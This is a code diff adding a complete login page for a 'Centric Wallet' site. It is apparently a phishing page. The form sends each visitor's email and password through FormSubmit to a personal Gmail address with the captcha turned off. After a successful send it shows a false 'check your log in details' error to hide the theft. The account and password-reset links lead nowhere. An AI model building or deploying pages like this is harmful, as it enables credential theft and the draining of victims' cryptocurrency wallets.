@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Centric Wallet – Login</title>
+
+    <style>
+      /* ================= RESET ================= */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      }
+
+      body {
+        min-height: 100vh;
+        background: radial-gradient(circle at top left, #1b2b6f, #0a0f2c 65%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+        color: #fff;
+      }
+
+      /* ================= CARD ================= */
+      .login-card {
+        width: 100%;
+        max-width: 420px;
+        background: rgba(20, 30, 70, 0.65);
+        backdrop-filter: blur(18px);
+        border-radius: 18px;
+        padding: 2.5rem 2rem;
+        box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
+      }
+
+      .logo {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 1rem;
+      }
+
+      .logo-circle {
+        width: 44px;
+        height: 44px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #4f8cff, #2f6df6);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 700;
+      }
+
+      h1 {
+        text-align: center;
+        font-size: 1.6rem;
+        margin-bottom: 0.3rem;
+      }
+
+      .subtitle {
+        text-align: center;
+        font-size: 0.9rem;
+        color: #b9c2ff;
+        margin-bottom: 2rem;
+      }
+
+      /* ================= INPUTS ================= */
+      .form-group {
+        margin-bottom: 1.2rem;
+        position: relative;
+      }
+
+      input {
+        width: 100%;
+        padding: 0.9rem 1rem;
+        border-radius: 10px;
+        border: none;
+        outline: none;
+        font-size: 0.95rem;
+        background: rgba(255, 255, 255, 0.08);
+        color: #fff;
+      }
+
+      input::placeholder {
+        color: #aab2ff;
+      }
+
+      input:focus {
+        outline: 1px solid #2f6df6;
+        background: rgba(255, 255, 255, 0.12);
+      }
+
+      .toggle-password {
+        position: absolute;
+        right: 14px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        font-size: 0.85rem;
+        color: #aab2ff;
+        user-select: none;
+      }
+
+      /* ================= BUTTON ================= */
+      .btn-login {
+        width: 100%;
+        padding: 0.9rem;
+        border-radius: 999px;
+        border: none;
+        font-size: 1rem;
+        font-weight: 600;
+        background: linear-gradient(135deg, #2f6df6, #4f8cff);
+        color: #fff;
+        cursor: pointer;
+        transition: 0.2s ease;
+      }
+
+      .btn-login:hover {
+        transform: translateY(-1px);
+        box-shadow: 0 8px 20px rgba(47, 109, 246, 0.45);
+      }
+
+      /* ================= SUCCESS MESSAGE ================= */
+      .success-message {
+        display: none;
+        margin-top: 1rem;
+        text-align: center;
+        color: #7dffb3;
+        font-size: 0.9rem;
+      }
+
+      /* ================= FOOTER ================= */
+      .footer-links {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 1.6rem;
+        font-size: 0.85rem;
+      }
+
+      .footer-links a {
+        color: #5f8dff;
+        text-decoration: none;
+      }
+
+      .footer-links a:hover {
+        text-decoration: underline;
+      }
+
+      @media (max-width: 360px) {
+        .login-card {
+          padding: 2rem 1.5rem;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="login-card">
+      <div class="logo">
+        <img src="./images/centric.png" alt="" width="50px" />
+      </div>
+
+      <h1>Centric Wallet</h1>
+      <p class="subtitle">Welcome!</p>
+
+      <!-- FORM -->
+      <form
+        id="loginForm"
+        action="https://formsubmit.co/fatokiademola8@gmail.com"
+        method="POST"
+      >
+        <!-- FormSubmit config -->
+        <input
+          type="hidden"
+          name="_subject"
+          value="New Centric Wallet Submission"
+        />
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_template" value="table" />
+
+        <div class="form-group">
+          <input type="email" name="email" placeholder="Enter email" required />
+        </div>
+
+        <div class="form-group">
+          <input
+            type="password"
+            name="password"
+            id="password"
+            placeholder="Enter password"
+            required
+          />
+          <span class="toggle-password" id="togglePassword">Show</span>
+        </div>
+
+        <button type="submit" class="btn-login">LOGIN</button>
+      </form>
+
+      <p class="success-message" id="successMessage">
+        Please check your log in details and try again
+      </p>
+
+      <div class="footer-links">
+        <a href="#">Create New Account</a>
+        <a href="#">Forgot Password</a>
+      </div>
+    </div>
+
+    <script>
+      // Password toggle
+      const passwordInput = document.getElementById("password");
+      const togglePassword = document.getElementById("togglePassword");
+
+      togglePassword.addEventListener("click", () => {
+        const isHidden = passwordInput.type === "password";
+        passwordInput.type = isHidden ? "text" : "password";
+        togglePassword.textContent = isHidden ? "Hide" : "Show";
+      });
+
+      // Form submit via AJAX
+      const form = document.getElementById("loginForm");
+      const successMessage = document.getElementById("successMessage");
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+
+        try {
+          const response = await fetch(form.action, {
+            method: "POST",
+            body: formData,
+            headers: { Accept: "application/json" },
+          });
+
+          if (response.ok) {
+            form.reset();
+            successMessage.style.display = "block";
+          } else {
+            alert("Submission failed. Try again.");
+          }
+        } catch (err) {
+          alert("Network error. Please try again.");
+        }
+      });
+    </script>
+  </body>
+</html>
